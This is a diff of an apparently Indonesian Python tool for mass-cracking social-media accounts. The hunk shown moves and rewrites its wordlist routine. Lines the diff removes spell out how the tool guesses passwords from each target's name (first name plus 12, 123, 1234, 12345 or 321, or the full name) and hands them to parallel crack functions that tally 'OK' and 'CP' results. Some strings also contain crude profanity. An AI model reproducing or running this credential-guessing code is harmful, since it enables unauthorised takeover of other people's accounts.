@@ -1000,9 +1000,11 @@ def setting():
 		print(' [red]Gausah pke scnya kontol klo ga pilih Prabowo ')
 		str(tai)
 	passwrd()
+	input(f'[{x} Klik "{m}Enter{x}" Untuk Kembali Kemenu{x}]')
+	pepek()
+
 #-------------------[ BAGIAN-WORDLIST ]------------#
-def passwrddd():
-	loading()
+def passwrd():
 	clear()
 	banner()
 	print(nel(f'                !{H} PROSES CRACK SEDANG BERLANGSUNG{N} !'))
@@ -1045,56 +1047,8 @@ def passwrddd():
 				pool.submit(_messenger_,uid,pwv)
 			else:
 				pool.submit(_validate_,uid,pwv)
-				
-	print('')
-	cetak(nel('\t    [cyan][bold green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan][white] '))
 	print(f'[•]{H2} OK : {H2}%s '%(ok))
 	print(f'[•]{K2} CP : {K2}%s '%(cp))
-	input(f'[{x} Klik "{m}Enter{x}" Untuk Kembali Kemenu{x}]')
-	pepek()
-#-------------------[ BAGIAN-WORDLIST ]------------#
-def passwrd():
-	clear()
-	banner()
-	prints(nel(f'       {P2}{M2}!{P2} PROSES CRACK SEDANG BERLANGSUNG{M2} !{P2}',style=f"bold purple")) 
-	with tred(max_workers=30) as pool:
-		for yuzong in id2:
-			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-			frs = nmf.split(' ')[0]
-			pwv = []
-			if len(nmf)<6:
-				if len(frs)<3:
-					pass
-				else:
-					pwv.append(frs+'12')
-					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
-					pwv.append(frs+'321')
-			else:
-				if len(frs)<3:
-					pwv.append(nmf)
-				else:
-					pwv.append(nmf)
-					pwv.append(frs+'12')
-					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
-					pwv.append(frs+'321')
-			if 'ya' in pwpluss:
-				for xpwd in pwnya:
-					pwv.append(xpwd)
-			else:pass
-			if 'metod1' in method:
-				pool.submit(crack,idf,pwv)
-			elif 'metod2' in method:
-				pool.submit(crackfree,idf,pwv)
-			elif 'metod3' in method:
-				pool.submit(metod3,idf,pwv)
-			else:
-				pool.submit(crackmbasic,idf,pwv)
-	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
-	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
 #--------------------[ METODE VALIDATE ]-----------------#
 def validate1(idf,pwv):
 	global loop,ok,cp
